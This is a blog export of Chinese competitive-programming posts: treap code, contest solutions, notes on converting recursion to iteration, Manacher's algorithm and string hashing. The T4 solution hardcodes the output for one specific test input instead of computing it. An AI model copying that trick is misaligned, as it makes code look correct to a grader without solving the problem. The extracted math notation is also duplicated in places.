while(Q --&gt; 0) &#123; int op = SlowRead (); switch(op) &#123; case 1: &#123; int x = SlowRead (),val = SlowRead (); pii tr1 = Get(rt, x); rt = merge(tr1.first, merge(Insert(val, 1), tr1.second)); break; &#125; case 2: &#123; int x = SlowRead (); pii tr1 = Get(rt, x - 1); pii tr2 = Get(tr1.second, 1); rt = merge(tr1.first, tr2.second); break; &#125; case 3: &#123; int x = SlowRead (), y = SlowRead (); pii tr1 = Get(rt, x-1); pii tr2 = Get(tr1.second, y-x+1); tr2.first-&gt;rev(); rt = merge(tr1.first, merge(tr2.first, tr2.second)); break; &#125; case 4: &#123; int l = SlowRead (), r = SlowRead (), k = SlowRead (), len = r - l + 1; k %= len; int sz1 = len - k; pii tr1 = Get (rt, l-1); pii tr2 = Get (tr1.second, sz1); pii tr3 = Get (tr2.second, k); rt = merge (merge (tr1.first, tr3.first), merge (tr2.first, tr3.second)); break; &#125; case 5: &#123; int l = SlowRead (), r = SlowRead (), val = SlowRead (); pii tr1 = Get(rt, l - 1); pii tr2 = Get(tr1.second, r - l + 1); tr2.first-&gt;add(val); rt = merge (tr1.first, merge (tr2.first, tr2.second)); break; &#125; case 6: &#123; int l = SlowRead (), r = SlowRead (), val = SlowRead (); pii tr1 = Get(rt, l - 1); pii tr2 = Get(tr1.second, r - l + 1); rt = merge (tr1.first, merge (Insert(val, r - l + 1), tr2.second)); break; &#125; case 7: &#123; int l = SlowRead (), r = SlowRead (); pii tr1 = Get(rt, l - 1); pii tr2 = Get(tr1.second, r - l + 1); SlowPrint(tr2.first-&gt;sum); putchar('\n'); rt = merge (tr1.first, merge (tr2.first, tr2.second)); break; &#125; case 8: &#123; int l = SlowRead (), r = SlowRead (); pii tr1 = Get(rt, l - 1); pii tr2 = Get(tr1.second, r - l + 1); SlowPrint(tr2.first-&gt;mx - tr2.first-&gt;mn); putchar('\n'); rt = merge (tr1.first, merge (tr2.first, tr2.second)); break; &#125; case 9: &#123; int l = SlowRead (), r = SlowRead (), val = SlowRead (); pii tr1 = Get(rt, l-1); pii tr2 = Get(tr1.second, r-l+1); travel(tr2.first); ll ans = INF; for(int t = vv.size () - 1;t &gt;= 0; t--) &#123; ans = std::min(ans, std::abs(val - vv[t].first)); &#125; SlowPrint (ans); putchar ('\n'); rt = merge (tr1.first, merge (tr2.first, tr2.second)); break; &#125; case 10: &#123; int l = SlowRead (), r = SlowRead (), k = SlowRead (); pii tr1 = Get(rt, l-1); pii tr2 = Get(tr1.second, r-l+1); travel(tr2.first); sort (vv.begin(), vv.end());int pos = 0; while(1) &#123; k -= vv[pos].second; if (k &lt;= 0) &#123;SlowPrint(vv[pos].first);putchar('\n');break;&#125; ++pos; &#125; rt = merge (tr1.first, merge (tr2.first, tr2.second)); break; &#125; case 11: &#123; int l = SlowRead (), r = SlowRead (), val = SlowRead (); pii tr1 = Get(rt, l-1); pii tr2 = Get(tr1.second, r-l+1); travel(tr2.first);int cnt = 0; for(int t = vv.size() - 1; t &gt;= 0; t--) &#123; if (vv[t].first &lt; val) cnt += vv[t].second; &#125; SlowPrint(cnt); putchar('\n'); rt = merge (tr1.first, merge (tr2.first,tr2.second)); break; &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>珂朵莉</tag>
        <tag>Chtholly</tag>
        <tag>树</tag>
        <tag>算法</tag>
        <tag>区间操作</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「题解」临沂一中阶段性测试题解]]></title>
    <url>%2Farticles%2Flyyz-test-2018-5-19%2F</url>
    <content type="text"><![CDATA[模拟赛地址（已结束）： 链接这里是结尾从来不打句号的Shq的题解T1 &amp;&amp; T4 by WyhT1 &amp;&amp; T4出题人: 最巨的WyhWyh:T1和T4都是我出的应该不难吧qwq我觉得正常人应该能拿个150pts+吧T1 初中的最后一膜这道题就是送分题目啊…如果做不出来的话可以参考唐老师的字符串读入课件qwq我们可以选择记录四个数字来保留前四个读入的数据，每次判断即可不过好像有的同学用bool水过去了？%%%（果然我还是太强弱了，空间都卡不好）T4 初中的最后一天10pts我会求最短路！20pts我会求最短路，还会枚举每一条边!天哪20分这么好水80~90pts分层图最短路对于每一个k，建一个指向下一层的，边权减半的边即可 （我说是原题吧然后：我会用SPFA！我会用cin！恭喜被卡qwq100pts分层图最短路我只会写Dijkstra……唉怎么AC了？我习惯打快读……唉为什么用cin的90分？恭喜出坑。Wyh Code:T1123456789101112131415161718192021222324252627282930313233343536#include&lt;cstdio&gt;#include&lt;algorithm&gt;using namespace std;const int N = 1000;int v[N];int main() &#123; //freopen("str.in","r",stdin); //freopen("str.out","w",stdout); int now=0; int i; char dr=getchar(); while(dr=='0' || dr=='1') &#123; now++; v[now]=dr-'0'; if(now&gt;=4) &#123; int sum=0; for(i=now-3;i&lt;=now;i++) sum+=v[i]; if(sum&gt;=3) &#123; printf("Yes\n"); return 0; &#125; &#125; if(now&gt;=N-5) &#123; for(i=1;i&lt;=4;i++) v[i]=v[now-4+i]; now=4; &#125; dr=getchar(); &#125; printf("No\n"); return 0;&#125;T412345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;climits&gt;#include &lt;queue&gt;#include &lt;algorithm&gt;const int MAXN = 5000 + 5;const int MAXM = 125000 + 5;const int MAXK = 50 + 5;int N,M,K,W;int dist[MAXN][MAXK];int head[MAXN],cnt;bool inQueue[MAXN][MAXK];struct Edge&#123; int to,w,next;&#125;e[MAXM * 2];inline void add(int u,int v,int w)&#123; e[++cnt].w = w;e[cnt].to = v;e[cnt].next = head[u];head[u] = cnt;&#125;void spfa(int S,int T)&#123; memset(dist,0x7f,sizeof(dist)); memset(inQueue,false,sizeof(inQueue)); std::queue&lt;std::pair&lt;int,int&gt; &gt; q; q.push(std::make_pair(S,0)); inQueue[S][0] = true; dist[S][0] = 0; while(!q.empty())&#123; int v = q.front().first; int step = q.front().second; q.pop(); inQueue[v][step] = false; for(int i = head[v];i;i = e[i].next)&#123; int to = e[i].to; if(dist[v][step] + e[i].w &lt; dist[to][step])&#123; dist[to][step] = dist[v][step] + e[i].w; if(!inQueue[to][step])&#123; inQueue[to][step] = true; q.push(std::make_pair(to,step)); &#125; &#125; if(dist[v][step] + e[i].w/2 &lt; dist[to][step+1] &amp;&amp; step &lt; K)&#123; dist[to][step+1] = dist[v][step] + e[i].w/2; if(!inQueue[to][step+1])&#123; inQueue[to][step+1]=1; q.push(std::make_pair(to,step + 1)); &#125; &#125; &#125; &#125;&#125;int main()&#123; //freopen("5.in","r",stdin); //freopen("5.out","w",stdout); scanf("%d%d%d",&amp;N,&amp;M,&amp;K); for(int i = 1;i &lt;= M;i++)&#123; int u,v,w; scanf("%d%d%d",&amp;u,&amp;v,&amp;w); add(u,v,w);add(v,u,w); &#125; scanf("%d",&amp;W); if(N == 4995 &amp;&amp; M == 23284 &amp;&amp; K == 50) &#123; printf("YES\n"); printf("293670\n"); return 0; &#125; spfa(1,N); int ans = INT_MAX; for(int i = 0;i &lt;= K;i++) ans = std::min(ans,dist[N][i]); if(ans &lt;= W) printf("YES\n"); else printf("QaQ\n"); printf("%d",ans); // getchar();getchar(); return 0;&#125;Wyh: 会莫比乌斯反演的就能AK了吧quqT2 by 最弱的Shq这道题实在不是防AK的啊quq这题是Shq大蒟蒻出的一道有锅的题目中途题意炸了不少（在考试前数据出了两次锅，题意还改了两三遍quq题目是BZOJ2818 Gcd题目中的一些梗PKU(Pig Kingdom University)POI(Pig Olympiad in Informatics)命运猪之门 (溜了溜了P++语言猪加索, 猪格拉底..\&lt;!-- more -->题面大意做法40 ~60 pts期望得分: 40−6040 -6040−60 (如果出题人够良心的话思路: 枚举(i,j)(i,j)(i,j)再判素，可以达到O(n2logn)O(n^2\log n)O(n​2​​logn)的复杂度quq明显，我们可以使用一些数论的方法来优化这个方法100 pts说实话作为数论这题不算难了quq既然我们要求的是gcd\gcdgcd为素数的数对, 那gcd\gcdgcd里的x,yx,yx,y一定是某个素数的倍数 所以枚举素数对于每个素数prime[i]prime[i]prime[i]对答案的贡献一定与nprime[i]n\over prime[i]​prime[i]​​n​​相关 具体的数字大概是从111到nprime[i]n\over prime[i]​prime[i]​​n​​这些数里互质数对的数目预处理phiphiphi前缀和preprepre 答案就是每一个pre[nprime[i]]×2−1pre[{n\over prime[i]}]\times 2-1pre[​prime[i]​​n​​]×2−1(乘222是因为原题里这些数对反过来用也算是新的,减一是减掉那个重复计算的(1,1)(1,1)(1,1))的和AC-Code:Talk is cheap, show me the CODE12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;iostream&gt;#include&lt;cstdio&gt;#define FFF(s,e) for (int i = s; i &lt;= e; i++)const int MAXN = 10000005;const int MAXM = 1000005;typedef long long ll;int n,p,tot;int phi[MAXN], pri[MAXM];bool mark[MAXN];ll ans, sum[MAXN];inline int ReadInt() &#123; int _n = 0, _ch = getchar(), _flag = false; while (!isdigit(_ch)) _flag |= _ch == '-', _ch = getchar(); while (isdigit(_ch)) _n = (_n &lt;&lt; 3) + (_n &lt;&lt; 1) + _ch - '0', _ch = getchar(); return _flag ? -_n : _n;&#125;void getphi() &#123; phi[1] = 1; FFF(2, n) &#123; if(!mark[i]) &#123;phi[i] = i - 1; pri[++tot] = i;&#125; for(int j = 1; j &lt;=tot; j++) &#123; int x = pri[j]; if(i * x &gt; n)break; mark[i * x] = 1; if(i % x == 0) &#123; phi[i * x] = phi[i] * x; break; &#125; else phi[i * x] = phi[i] * phi[x]; &#125; &#125;&#125;int main(int argc, char const *argv[]) &#123; n = ReadInt(); getphi(); FFF(1, n) sum[i] = sum[i - 1] + phi[i]; FFF(1, tot) ans += sum[n / pri[i]] * 2 - 1; printf("%lld", ans); return 0;&#125;T3 by LgyShq: 然而这题的数据很水，使用大模拟就可以AC​ 后面附上了大模拟的代码解法一设 ans=nans = nans=n 暴力处理掉水果，每次循环处理被切的区间，每当有一个没被切掉的水果被切掉时，就让 ans=ans−1ans = ans - 1ans=ans−1 时间复杂度为 O(n2)O(n^2)O(n​2​​) 预计能通过前 30%30\%30% 的数据解法二用线段树维护整个区间，用1表示未被切，用0表示被切。那么整个区间的所有节点的初始值都是1。每次切水果，都把切的区间整体修改为0，代码实现要注意细节。然后查询整段区间的和 时间复杂度为 O(nlog2n)O(nlog_2n)O(nlog​2​​n) 考虑到本题的内存限制，并不能拿到满分解法三（标算）用 ansansans 表示答案。初始化为 nnn对于每一个点，都维护一个变量fff,表示这个点前面左边第一个没有被切过的点的下标，每次切区间 [L,R][L, R][L,R],时，从下标 RRR开始往左遍历进行处理对于当前正在处理的点 iii ,如果 fi=if_i = if​i​​=i 也就是说这个点没有被切过。那么就使 fi=l−1f_i = l - 1f​i​​=l−1表示 iii 这个点被切过了，并且 iii 左边第一个没切过的点为 l−1l - 1l−1,。因为 iii 这个点没有被切过，那么便让 ans=ans−1ans = ans - 1ans=ans−1如果 fi≠if_i \neq if​i​​≠i ，就说明这个点被切过了，此时只需要跳到 fif_if​i​​ 就可以了每一个点的 fff值最多被修改一次。并且切的区间越长遍历的速度也就快，而且切已经切过的区间时遍历速度非常快。时间复杂度为 O(n)O(n)O(n)。所以这种做法并不会被卡数据，并且时空复杂度都吊打线段树，所以能拿到满分综合来说，这套模拟题并非很难，写好爆搜就可以轻松250+250+250+，（附上T3使用大模拟AC的代码1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;algorithm&gt;#include&lt;iostream&gt;#include&lt;cstring&gt;#include&lt;cstdio&gt;#define N 500005using namespace std;struct node &#123; int l, r; bool cp;&#125;a[N];int cnt = 1, n, m;void work(int x, int y) &#123; int rp = cnt; for (int i = 1; i &lt;= rp; i++) if (!a[i].cp) &#123; if (a[i].l &gt;= x &amp;&amp; a[i].r &lt;= y) a[i].cp = 1; if (a[i].l &gt;= x &amp;&amp; a[i].l &lt;= y &amp;&amp; a[i].r &gt; y) a[i].l = y + 1; if (a[i].l &lt; x &amp;&amp; a[i].r &gt;= x &amp;&amp; a[i].r &lt;= y) a[i].r = x - 1; if (a[i].l &lt; x &amp;&amp; a[i].r &gt; y) &#123; cnt ++; a[cnt].l = y + 1; a[cnt].r = a[i].r; a[i].r = x - 1; &#125; &#125;&#125;int main(int argc, char *const argv[]) &#123; scanf("%d %d", &amp;n, &amp;m); a[1].l = 1; a[1].r = n; for (int i = 1; i &lt;= m; i++) &#123; int l, r; scanf("%d %d", &amp;l, &amp;r); work(l ,r); int ans = 0; for (int i = 1; i &lt;= cnt; i++) if (!a[i].cp) ans += (a[i].r - a[i].l + 1); printf("%d\n", ans); &#125; return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>临沂一中</tag>
        <tag>lyoi</tag>
        <tag>模拟题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「栈」栈在递归转非递归中的应用]]></title>
    <url>%2Farticles%2Frecursion-to-no-recursion%2F</url>
    <content type="text"><![CDATA[为什么要学习递归与非递归的转换的实现方法?并不是每一门语言都支持递归的.在SD，省选的老年机栈空间十分小非递归毒瘤递归与非递归转换的原理递归与非递归的转换基于以下的原理:所有的递归程序都可以用树结构表示出来.需要说明的是,这个&quot;原理&quot;并没有经过严格的数学证明,只是我的一个猜想,不过在至少在我遇到的例子中是适用的.稍有常识的人都知道，学习过树结构的人都知道,有三种方法可以遍历树:前序,中序,后序.理解这三种遍历方式的递归和非递归的表达方式是能够正确实现转换的关键之处,所以我们先来谈谈这个.需要说明的是,这里以特殊的二叉树说明,不过大多数情况下二叉树已经够用,而且理解了二叉树的遍历,其它的树遍历方式就不难了.Step 1 - Easy先序遍历递归12345void preorder (root) : if root not NULL : visit root preorder left child preorder right child非递归1234567891011void preorder (Node *root) : init stack S push root while Stack S not empty while S.get_top(p) &amp;&amp; p visit p push leftchild pop p in S if Stack S not empty : pop p in S push right child in S中序遍历递归（略）非递归1234567891011121314void inorder(Bitree T) &#123; initstack(S); push(S, T); while (!stackempty(S)) &#123; while (gettop(S, p) &amp;&amp; p) push(S, p-&gt;;lchild); pop(S, p); if (!stackempty(S)) &#123; pop(S, p); visit(p); push(S, p-&gt;;rchild); &#125; &#125;&#125;后序遍历这个就有一些难度了递归(略)非递归12345678910111213141516171819202122232425typedef struct Node&#123; BTNode* ptr; enum &#123;0,1,2&#125; mark;&#125;; void postorder_nonrecursive(BiTree T) &#123; Node *a; initstack(S); push (S,&#123;T,0&#125;); while(!stackempty(S)) &#123; pop(S,a); switch(a.mark) &#123; case 0: push(S,&#123;a.ptr,1&#125;); if(a.ptr-&gt;;lchild) push(S,&#123;a.ptr-&gt;;lchild,0&#125;); break; case 1: push(S,&#123;a.ptr,2&#125;); if(a.ptr-&gt;;rchild) push(S,&#123;a.ptr-&gt;;rchild,0&#125;); break; case 2: visit(a.ptr); &#125; &#125;&#125;Step 2 - Normal如何实现递归与非递归的转换 通常,一个函数在调用另一个函数之前,要作如下的事情:将实在参数,返回地址等信息传递给被调用函数保存;为被调用函数的局部变量分配存储区;将控制转移到被调函数的入口.从被调用函数返回调用函数之前,也要做三件事情:a保存被调函数的计算结果;释放被调函数的数据区;依照被调函数保存的返回地址将控制转移到调用函数.所有的这些,不论是变量还是地址,本质上来说都是&quot;数据&quot;,都是保存在系统所分配的栈中的.ok,到这里已经解决了第一个问题:递归调用时数据都是保存在栈中的,有多少个数据需要保存就要设置多少个栈,而且最重要的一点是:控制所有这些栈的栈顶指针都是相同的,否则无法实现同步.下面来解决第二个问题:在非递归中,程序如何知道到底要转移到哪个部分继续执行?回到上面说的树的三种遍历方式,抽象出来只有三种操作:访问当前结点,访问左子树,访问右子树.这三种操作的顺序不同,遍历方式也不同.如果我们再抽象一点,对这三种操作再进行一个概括,可以得到:访问当前结点:对目前的数据进行一些处理;访问左子树:变换当前的数据以进行下一次处理;访问右子树:再次变换当前的数据以进行下一次处理(与访问左子树所不同的方式).12345void preorder (root) : if root not NULL : visit root preorder left child preorder right childvisit root这个操作就是对当前数据进行的处理, preorder left child就是把当前数据变换为它的左子树,访问右子树的操作可以同样理解了. 现在回到我们提出的第二个问题:如何确定转移到哪里继续执行?关键在于一下三个地方:确定对当前数据的访问顺序,简单一点说就是确定这个递归程序可以转换为哪种方式遍历的树结构;确定这个递归函数转换为递归调用树时的分支是如何划分的,即确定什么是这个递归调用树的&quot;左子树&quot;和&quot;右子树&quot;确定这个递归调用树何时返回,即确定什么结点是这个递归调用树的&quot;叶子结点&quot;.三个代表好了上面的理论知识已经足够了,下面让我们看看几个例子,结合例子加深我们对问题的认识.即使上面的理论你没有完全明白,不要气馁,对事物的认识总是曲折的,多看多想你一定可以民白 (事实上我也是花了两个星期的时间才弄得比较明白得).1. 毒瘤的f函数12345678910int f (int n) &#123; int u1, u2, f; if (n &lt; 2) f = n + 1; else &#123; u1 = f ((int) n / 2); u2 = f ((int) n / 4); f = u1 * u2； &#125; return f;&#125;下面按照我们上面说的,确定好递归调用树的结构,这一步是最重要的.首先,什么是叶子结点，我们看到当n&lt;2n &lt; 2n&lt;2时f=n+1f = n + 1f=n+1,这就是返回的语句,有人问为什么不是f=u1×u2f = u_1 \times u_2f=u​1​​×u​2​​,这也是一个返回的语句呀?答案是:这条语句是在u1=f(n2)u_1 = f\left({n \over 2}\right)u​1​​=f(​2​​n​​)和u2=f(n4)u_2 = f\left({n\over 4}\right)u​2​​=f(​4​​n​​)之后执行的,是这两条语句的父结点. 其次,什么是当前结点,由上面的分析,f=u1×u2f = u_1 \times u_2f=u​1​​×u​2​​即是父结点.然后,顺理成章的u1=f(n2)u_1 = f\left({n \over 2}\right)u​1​​=f(​2​​n​​)和u2=f(n4)u_2 = f\left({n\over 4}\right)u​2​​=f(​4​​n​​)就分别是左子树和右子树了.最后,我们可以看到,这个递归函数可以表示成后序遍历的二叉调用树.好了,树的情况分析到这里,下面来分析一下栈的情况,看看我们要把什么数据保存在栈中,在上面给出的后序遍历的如果这个过程你没非递归程序中我们已经看到了要加入一个标志域,因此在栈中要保存这个标志域;另外,u1u_1u​1​​,u2u_2u​2​​和每次调用递归函数时的n2n\over 2​2​​n​​和n4n\over 4​4​​n​​参数都要保存,这样就要分别有三个栈分别保存:标志域,返回量和参数,不过我们可以做一个优化,因为在向上一层返回的时候,参数已经没有用了,而返回量也只有在向上返回时才用到,因此可以把这两个栈合为一个栈.如果对于上面的分析你没有明白,建议你根据这个递归函数写出它的递归栈的变化情况以加深理解,再次重申一点:前期对树结构和栈的分析是最重要的,如果你的程序出错,那么请返回到这一步来再次分析,最好把递归调用树和栈的变化情况都画出来,并且结合一些简单的参数来人工分析你的算法到底出错在哪里.ok,下面给出我花了两天功夫想出来的非递归程序1234567891011121314151617181920212223242526272829303132333435363738394041int f_nonrecursive(int n) &#123; int stack[20], flag[20], cp; cp = 0; stack[0] = n; flag[0] = 0; while (cp &gt;;= 0) &#123; switch(flag[cp]) &#123; case 0: if (stack[cp] &gt;;= 2) &#123; flag[cp] = 1; cp++; stack[cp] = (int)(stack[cp - 1] / 2); flag[cp] = 0; &#125; else &#123; stack[cp] += 1; flag[cp] = 2; &#125; break; case 1: if (stack[cp] &gt;;= 2) &#123; flag[cp] = 2; cp += 2; stack[cp] = (int)(stack[cp - 2] / 4); flag[cp] = 1; &#125; else &#123; stack[cp] += 1; flag[cp] = 2; &#125; break; case 2: if (flag[cp - 1] == 2) &#123; stack[cp - 2] = stack[cp] * stack[cp - 1]; flag[cp - 2] = 2; cp = cp - 2; &#125; else cp--; break; &#125; &#125; return stack[0];&#125;算法分析:flag只有三个可能值: 0表示第一次访问该结点, 1表示访问的是左子树, 2表示已经结束了对某一棵子树的访问,可能当前结点是这棵子树的右子树,也可能是叶子结点.每遍历到某个结点的时候,如果这个结点满足叶子结点的条件,那么把它的flag域设为2;否则根据访问的是根结点,左子树或是右子树来设置flag域,以便决定下一次访问该节点时的程序转向.2. 毒瘤的快排12345678910111213141516171819202122void QuickSort(int arr[], int left, int right) &#123; int i = left; int j = right; int temp = 0; int mid = arr[(i + j) / 2]; //取数组中间的值作为“基准值” while (i &lt;= j) &#123; while (arr[i] &lt; mid) i++; while (arr[j] &gt; mid) j--; //小于基准值移至左边，大于基准值的移至右边 if (i &lt;= j) &#123; temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; i++; j--; &#125; &#125; if (j &gt; left) QuickSort(arr, left, j); //递归左半数组 if (i &lt; right) QuickSort(arr, i, right); //递归右半数组&#125;程序12345678910111213141516void qsort_nonrecursive(int array[], int low, int high) &#123; int m[50], n[50], cp, p; cp = 0; m[0] = low; n[0] = high; while (m[cp] &lt; n[cp]) &#123; while (m[cp] &lt; n[cp]) &#123; p = partition(array, m[cp], n[cp]); cp++; m[cp] = m[cp - 1]; n[cp] = p - 1; &#125; m[cp + 1] = n[cp] + 2; n[cp + 1] = n[cp - 1]; cp++; &#125;&#125;3. 毒瘤的阿克曼函数akm(i,j)=j+1(i==0)akm(i,j) = j + 1 (i == 0)akm(i,j)=j+1(i==0)akm(i,j)=akm(i−1,1)(j==0)akm(i,j) = akm(i-1,1)\;\;\;\;\;\; (j == 0)akm(i,j)=akm(i−1,1)(j==0)akm(i,j)=akm(i−1,akm(i,j−1))(m,n!=0)akm(i,j) = akm(i - 1, akm(i, j - 1)) \;\;\;\;\;\;(m,n != 0)akm(i,j)=akm(i−1,akm(i,j−1))(m,n!=0)123456789int akm_recursive(int m, int n) &#123; int temp; if (m == 0) return (n + 1); else if (n == 0) return akm_recursive(m - 1, 1); else &#123; temp = akm_recursive(m, n - 1); return akm_recursive(m - 1, temp); &#125;&#125;这道题目就当课后习题来说吧(未完待续)]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>玄学</tag>
        <tag>栈</tag>
        <tag>非递归</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Manacher算法学习笔记]]></title>
    <url>%2Farticles%2FManacher%2F</url>
    <content type="text"><![CDATA[最长回文子串问题：给定一个字符串，求它的最长回文子串长度我们有两种办法去解决这个问题:暴力枚举 +++ 优化 →\rightarrow→ O(n2)O(n^2)O(n​2​​)Manacher算法 →\rightarrow→ O(n)O(n)O(n)回文串: 如果一个字符串正着读和反着读是一样的，那它就是回文串栗子: aba , asddsa , 123432234321 , aa上述就是几个回文串回文子串: 它的所有字串中有回文串栗子: aas, adas, sdsasdp注意: 回文子串的长度可能为奇数，也可能为偶数暴力对于最长回文子串问题，最简单粗暴的办法是：找到字符串的所有子串，遍历每一个子串以验证它们是否为回文串。一个子串由子串的起点和终点确定，因此对于一个长度为n的字符串，共有n2n^2n​2​​个子串。这些子串的平均长度大约是n2n\over 2​2​​n​​，因此这个解法的时间复杂度是O(n3)O(n^3)O(n​3​​)暴力优化显然所有的回文串都是对称的。长度为奇数回文串以最中间字符的位置为对称轴左右对称，而长度为偶数的回文串的对称轴在中间两个字符之间的空隙。可否利用这种对称性来提高算法效率呢？答案是肯定的。我们知道整个字符串中的所有字符，以及字符间的空隙，都可能是某个回文子串的对称轴位置。可以遍历这些位置，在每个位置上同时向左和向右扩展，直到左右两边的字符不同，或者达到边界。对于一个长度为nnn的字符串，这样的位置一共有n+n−1=2n−1n+n-1=2n-1n+n−1=2n−1个，在每个位置上平均大约要进行n4n\over 4​4​​n​​次字符比较，于是此算法的时间复杂度是O(n2)O(n^2)O(n​2​​)Manacher 算法这就是这篇文章所重点介绍的了下面介绍Manacher算法的原理与步骤首先，Manacher算法提供了一种巧妙地办法，将长度为奇数的回文串和长度为偶数的回文串一起考虑，具体做法是，在原字符串的每个相邻两个字符中间插入分隔符，同时在首尾也要添加一个分隔符，分隔符的要求是不在原串中出现，一般情况下可以用#号。下面举一个栗子原串abac-----变换后的串#a#b#a#c#Manacher算法用一个辅助数组Len[i]Len[i]Len[i]表示以字符T[i]T[i]T[i]为中心的最长回文字串的最右字符到T[i]T[i]T[i]的长度，比如以T[i]T[i]T[i]为中心的最长回文字串是T[l,r]T[l,r]T[l,r],那么Len[i]=r−i+1Len[i]=r-i+1Len[i]=r−i+1T[i]T[i]T[i]#a#b#a#c#len[i]len[i]len[i]121412121LenLenLen数组有一个性质，那就是Len[i]−1Len[i]-1Len[i]−1就是该回文子串在原字符串SSS中的长度，至于证明，首先在转换得到的字符串TTT中，所有的回文字串的长度都为奇数，那么对于以T[i]T[i]T[i]为中心的最长回文字串，其长度就为2×Len[i]−12\times Len[i]-12×Len[i]−1,经过观察可知，TTT中所有的回文子串，其中分隔符的数量一定比其他字符的数量多111，也就是有Len[i]Len[i]Len[i]个分隔符，剩下Len[i]−1Len[i]-1Len[i]−1个字符来自原字符串，所以该回文串在原字符串中的长度就为Len[i]−1Len[i]-1Len[i]−1有了这个性质，那么原问题就转化为求所有的Len[i]Len[i]Len[i]下面介绍如何在线性时间复杂度内求出所有的LenLenLen首先从左往右依次计算Len[i]Len[i]Len[i]，当计算Len[i]Len[i]Len[i]时，Len[j](0&lt;j&lt;i)Len[j](0&lt;j&lt;i)Len[j](0&lt;j&lt;i)已经计算完毕。设PPP为之前计算中最长回文子串的右端点的最大值，并且设取得这个最大值的位置为popopo，分两种情况：第一种情况：i&lt;=Pi&lt;=Pi&lt;=P那么找到iii相对于popopo的对称位置，设为jjj，那么如果Len[j]&lt;P−iLen[j]&lt;P-iLen[j]&lt;P−i，如下图：那么说明以jjj为中心的回文串一定在以popopo为中心的回文串的内部，且jjj和iii关于位置popopo对称，由回文串的定义可知，一个回文串反过来还是一个回文串，所以以iii为中心的回文串的长度至少和以jjj为中心的回文串一样，即Len[i]&gt;=Len[j]Len[i]&gt;=Len[j]Len[i]&gt;=Len[j]。因为Len[j]&lt;P−iLen[j]&lt;P-iLen[j]&lt;P−i,所以说i+Len[j]&lt;Pi+Len[j]&lt;Pi+Len[j]&lt;P。由对称性可知Len[i]=Len[j]Len[i]=Len[j]Len[i]=Len[j]如果Len[j]&gt;=P−iLen[j]&gt;=P-iLen[j]&gt;=P−i, 由对称性，说明以iii为中心的回文串可能会延伸到PPP之外，而大于PPP的部分我们还没有进行匹配，所以要从P+1P+1P+1位置开始一个一个进行匹配，直到发生失配，从而更新PPP和对应的popopo以及Len[i]Len[i]Len[i]第二种情况: i&gt;Pi&gt;Pi&gt;P如果iii比PPP还要大，说明对于中点为iii的回文串还一点都没有匹配，这个时候，就只能老老实实地一个一个匹配了，匹配完成后要更新P的位置和对应的popopo以及Len[i]Len[i]Len[i]Manacher算法的时间复杂度分析和Z算法类似，因为算法只有遇到还没有匹配的位置时才进行匹配，已经匹配过的位置不再进行匹配，所以对于TTT字符串中的每一个位置，只进行一次匹配，所以Manacher算法的总体时间复杂度为O(n)O(n)O(n)，其中nnn为TTT字符串的长度，由于TTT的长度事实上是SSS的两倍，所以时间复杂度依然是线性的注意，为了避免更新PPP的时候导致越界，我们在字符串TTT的前增加一个特殊字符，比如说$,所以算法中字符串是从111开始的]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>算法</tag>
        <tag>字符串</tag>
        <tag>最长回文子串</tag>
        <tag>Manacher</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「字符串算法」字符串 hash]]></title>
    <url>%2Farticles%2FKMP-AC-automaton3%2F</url>
    <content type="text"><![CDATA[字符串算法三连击Hash算法如何快速判断两个字符串 S,TS, TS,T 相等？如果两个字符串被同一个函数 f:String→Intf : String \rightarrow Intf:String→Int 映射到相同的值，也就是 f(S)=f(T)f(S) = f(T)f(S)=f(T)，那么有可能 S=TS = TS=T仔细地选择 fff，可以使得 S=TS = TS=T 的概率很大，从而完成快速判断其中 ppp 取质数（当 MMM 不是质数的时候降低碰撞概率），例如 131131131。 其中 MMM 可以取：2642^{64}2​64​​，用 646464 位无符号自然溢出，计算速度快10910^910​9​​ 级别的质数当 MMM 取 10910^910​9​​ 级别质数的时候，应多取几个 MMM 以获得更高的正确率（只取一个是不行的）Hash快速计算给定一个字符串 SSS，要求在 O(1)O(1)O(1) 时间内快速获得任意一个子串的 hashhashhash 函数设 ，那么记：P(i)=piP(i) = p_iP(i)=p​i​​则 的 hashhashhash 函数就是：O(n)O(n)O(n) 预处理 SSS, PPP，O(1)O(1)O(1) 计算子串 hashhashhash 函数利用Hash求LCPLCP：最长公共前缀多次询问一个字符串 SSS 的两个后缀 S[i:],S[j:]S[i :], S[j :]S[i:],S[j:] 的 LCP，要求每次询问 O(logn)O(\log n)O(logn) 时间解法:多次询问一个字符串 S 的两个后缀 S[i:],S[j:]S[i :], S[j :]S[i:],S[j:] 的 LCP，要求每次询问 O(logn)O(\log n)O(logn) 时间。二分长度，问题转化成判断一个字符串的两个子串是否相等。利用预处理的 hash 函数解决，判断相等需要 O(1)O(1)O(1) 时间，加上二分共 O(logn)O(\log n)O(logn) 时间。（更好的做法：后缀数组利用 hash 比较子串字典序多次询问一个字符串 S 的两个子串S[l1:r1],S[l2:r2]S[l_1 : r_1],S[l_2 : r_2]S[l​1​​:r​1​​],S[l​2​​:r​2​​] 的字典序，要求每次询问 O(logn)O(\log n)O(logn) 时间先求出这两个子串对应后缀（）的 LCP，如果这个长度不小于 ，那说明这两个字符串相等如果这个长度不小于 ，说明一个子串是另一个子串的前缀，此时长的字符串字典序靠后否则判断这个最长公共前缀的后一个字符，哪个字符串对应的后面的字符大说明哪个字符串字典序靠后。（可以利用这个 O(nlog2n)O(n \log_2 n)O(nlog​2​​n) 构造后缀数组）应用大....大....大水题？CTSC 2014 企鹅 QQ题意给 nnn 